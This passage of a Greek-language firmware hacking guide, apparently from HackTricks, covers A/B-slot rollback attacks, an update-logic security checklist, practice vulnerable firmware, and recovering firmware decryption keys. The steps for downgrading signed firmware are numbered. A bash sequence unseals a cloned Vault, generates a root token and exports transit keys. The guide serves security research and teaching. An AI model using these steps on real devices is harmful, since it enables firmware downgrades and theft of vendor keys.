Αυτό δημιουργεί ένα primitive **validate-one-image / boot-another-image** σε dual-slot systems. Αν ο attacker μπορεί να κάνει τον updater να σημειώσει το slot B ως τον επόμενο boot target χρησιμοποιώντας ένα current signed image και μπορεί αργότερα να αντικαταστήσει το slot B πριν από το reboot, ο bootloader μπορεί και πάλι να εκκινήσει το downgraded image, επειδή εμπιστεύεται μόνο τα ήδη committed slot metadata.

Συνηθισμένο abuse pattern:

1. Κάντε upload ένα **current signed** firmware στο passive slot και εκτελέστε την κανονική validation/switch routine, ώστε το layout να σημειώσει αυτό το slot ως το επόμενο active.
2. **Μην κάνετε reboot ακόμη**. Εισέλθετε ξανά στη slot-preparation/erase routine στην ίδια session.
3. Εκμεταλλευτείτε stale boot-state ή stale slot-selection logic, ώστε ο updater να διαγράψει το **ίδιο physical slot** που μόλις προωθήθηκε.
4. Γράψτε ένα **παλαιότερο αλλά ακόμη signed** firmware σε αυτό το slot.
5. Παραλείψτε τη validation routine που επιβάλλει το ratchet και κάντε απευθείας reboot.
6. Ο bootloader επιλέγει το promoted slot, επαληθεύει μόνο το signature/integrity και εκκινεί το παλιό image.

Πράγματα που πρέπει να αναζητήσετε κατά το reversing A/B update implementations:

- Επιλογή slot που προκύπτει από **boot-time flags**, τα οποία δεν ανανεώνονται μετά από επιτυχημένο switch.
- Μια routine τύπου `prepare_passive_slot()` που διαγράφει ένα slot με βάση stale state αντί για το **current committed layout**.
- Μια function τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
- Ratchet checks που υλοποιούνται σε userspace ή στον updater code, αλλά **όχι** στα ROM / bootloader / secure boot stages.
- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμη και αφού το περιεχόμενό του αφαιρεθεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση του Update Logic

* Προστατεύονται επαρκώς το transport/authentication του *update endpoint* (TLS + authentication);
* Η συσκευή συγκρίνει **version numbers** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε secure boot chain (π.χ. signatures checked by ROM code);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο signature/CRC;
* Είναι τα slot activation metadata **συνδεδεμένα με το validated firmware digest/version**, ή μπορεί ένα slot να τροποποιηθεί μετά το promotion;
* Μετά την επιτυχή αλλαγή slot, υποχρεώνεται η συσκευή να κάνει reboot ή παραμένουν προσβάσιμες μεταγενέστερες update/erase routines στην ίδια session;
* Εκτελεί ο userland code πρόσθετους sanity checks (π.χ. allowed partition map, model number);
* Χρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η platform πιθανότατα είναι ευάλωτη σε rollback attacks.

## Ευάλωτα firmware για εξάσκηση

Για να εξασκηθείτε στην ανακάλυψη vulnerabilities σε firmware, χρησιμοποιήστε τα ακόλουθα vulnerable firmware projects ως σημείο εκκίνησης.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση firmware decryption keys από embedded KMS/Vault state

Όταν ένα update image συνδυάζει μικρά plaintext metadata με ένα μεγάλο high-entropy blob, κάντε container triage πριν επιχειρήσετε brute-forcing:<sup>[[1]](#references)</sup>

- Κάντε dump των headers, offsets και line boundaries με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως σημαίνει format OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα Base64 field που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για RSA-2048 ciphertext που περιέχει ένα random firmware password/session key.
- Detached PGP material στο ίδιο file συχνά προστατεύει μόνο την authenticity· μην υποθέσετε ότι αποτελεί τον confidentiality mechanism.

Αν το static key hunting (`grep`, `strings`, PEM/PGP searches) αποτύχει, κάντε reverse το **operational decrypt path** αντί να αναζητάτε μόνο private keys:

- Κάντε decompile το updater / management binary και εντοπίστε ποιος διαβάζει το encrypted blob, ποιος helper/API το unwraps και ποιο logical key name ζητά.
- Αναζητήστε στο extracted root filesystem KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και unit files και init scripts.
- Αντιμετωπίστε plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή local KMS auto-unseal scripts ως ισοδύναμα με private-key material.

Αν η appliance περιλαμβάνει το original Vault binary και storage backend, η αναπαραγωγή αυτού του environment είναι συνήθως ευκολότερη από την επανυλοποίηση των Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
- Κάντε export το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλά Vault-backed flows χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του vendor (`EVP_BytesToKey`, συχνά MD5 σε legacy appliances) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Αυτό μετατρέπει το «κρυπτογραφημένο firmware» σε ένα γενικότερο πρόβλημα: **ανακτήστε τα operational keys στην πλευρά του appliance και, στη συνέχεια, αναπαραγάγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Δεξιότητα επιπέδου senior, αυτονομία επιπέδου junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία Security Testing Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Ο οριστικός οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days σε εγκαταλελειμμένο hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια Smart συσκευή των $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα με βλέπεις: τώρα είσαι Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting το Tesla Wall Connector από τον charge port connector του - Μέρος 2: παράκαμψη του anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
